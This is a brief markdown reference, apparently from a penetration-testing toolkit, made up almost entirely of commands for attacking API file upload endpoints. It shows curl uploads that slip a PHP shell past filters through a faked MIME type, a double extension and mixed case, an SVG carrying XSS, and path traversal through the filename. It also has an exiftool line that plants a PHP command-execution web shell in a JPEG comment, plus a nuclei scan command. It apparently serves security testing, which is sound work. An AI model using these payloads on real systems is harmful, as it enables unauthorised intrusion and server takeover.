<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
<!-- CIPHER is a trademark of defconxt. -->
# API Reference — Testing API File Upload Vulnerabilities

## curl — MIME Type Bypass
```bash
# Upload PHP payload with image MIME type
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@shell.php;type=image/jpeg" -w "%{http_code}"

# Upload SVG with embedded XSS
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@xss.svg;type=image/svg+xml"
```

## curl — Extension Bypass
```bash
# Double extension
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.php.jpg"

# Case manipulation
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@payload.PhP"
```

## curl — Path Traversal
```bash
# Directory traversal in filename
curl -s -X POST "https://target.com/api/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@test.txt;filename=../../../tmp/test.txt"
```

## exiftool — Metadata Injection
```bash
# Inject PHP payload into JPEG EXIF comment
exiftool -Comment='<?php system($_GET["c"]); ?>' clean.jpg -o payload.jpg

# Verify injected metadata
exiftool -Comment payload.jpg
```

## nuclei — Upload Vulnerability Templates
```bash
# Scan for unrestricted file upload
nuclei -u https://target.com -t http/vulnerabilities/unrestricted-upload.yaml \
  -H "Authorization: Bearer $TOKEN"
```
